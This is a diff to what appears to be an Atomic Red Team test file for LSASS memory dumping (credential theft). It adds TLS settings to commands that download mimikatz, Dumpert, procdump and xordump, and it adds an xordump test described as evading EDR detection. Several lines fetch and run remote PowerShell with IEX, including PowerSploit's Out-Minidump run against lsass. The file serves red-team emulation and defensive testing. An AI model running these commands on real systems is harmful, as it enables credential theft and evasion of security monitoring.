@@ -38,6 +38,7 @@ atomic_tests:
       if (Test-Path #{wce_exe}) {exit 0} else {exit 1}
     get_prereq_command: |
       $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
       if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}){
         Expand-Archive $zippath $parentpath\wce -Force
@@ -78,6 +79,7 @@ atomic_tests:
     prereq_command: |
       if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}
     get_prereq_command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
       Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
       New-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null
@@ -129,6 +131,7 @@ atomic_tests:
     prereq_command: |
       if (Test-Path #{dumpert_exe}) {exit 0} else {exit 1}
     get_prereq_command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       New-Item -ItemType Directory (Split-Path #{dumpert_exe}) -Force | Out-Null
       Invoke-WebRequest "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe" -OutFile #{dumpert_exe}
   executor:
@@ -138,6 +141,7 @@ atomic_tests:
       del C:\windows\temp\dumpert.dmp >nul 2> nul
     name: command_prompt
     elevation_required: true
+
 - name: Dump LSASS.exe Memory using Windows Task Manager
   auto_generated_guid: dea6c349-f1c6-44f3-87a1-1ed33a59a607
   description: |
@@ -158,6 +162,7 @@ atomic_tests:
       3. Dump lsass.exe memory:
         Right-click on lsass.exe in Task Manager. Select "Create Dump File". The following dialog will show you the path to the saved file.
     name: manual
+
 - name: Offline Credential Theft With Mimikatz
   auto_generated_guid: 453acf13-1dbd-47d7-b28a-172ce9228023
   description: |
@@ -181,6 +186,7 @@ atomic_tests:
     prereq_command: |
       if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}
     get_prereq_command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       $url = 'https://github.com/gentilkiwi/mimikatz/releases/latest'
       $request = [System.Net.WebRequest]::Create($url)
       $response = $request.GetResponse()
@@ -254,6 +260,7 @@ atomic_tests:
   - windows
   executor:
     command: |
+       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); get-process lsass | Out-Minidump
     cleanup_command: |
       Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
@@ -354,3 +361,38 @@ atomic_tests:
       del #{output_file}
     name: powershell
     elevation_required: true  
+
+- name: Dump LSASS.exe using imported Microsoft DLLs
+  auto_generated_guid: 86fc3f40-237f-4701-b155-81c01c48d697
+  description: |
+    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved by
+    importing built-in DLLs and calling exported functions. Xordump will re-read the resulting minidump 
+    file and delete it immediately to avoid brittle EDR detections that signature lsass minidump files.
+
+    Upon successful execution, you should see the following file created $env:TEMP\lsass-xordump.t1003.001.dmp.
+  supported_platforms:
+  - windows
+  input_arguments:
+    xordump_exe:
+      description: Path to xordump
+      type: Path
+      default: C:\Windows\Temp\xordump.exe
+    output_file:
+      description: Path where resulting dump should be placed
+      type: Path
+      default: C:\Windows\Temp\lsass-xordump.t1003.001.dmp
+  dependencies:
+  - description: |
+      Computer must have xordump.exe
+    prereq_command: |
+      if (Test-Path '#{xordump_exe}') {exit 0} else {exit 1}
+    get_prereq_command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      Invoke-WebRequest "https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe" -OutFile #{xordump_exe}
+  executor:
+    command: |
+      #{xordump_exe} -out #{output_file} -x 0x41
+    cleanup_command: |
+      Remove-Item ${output_file} -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
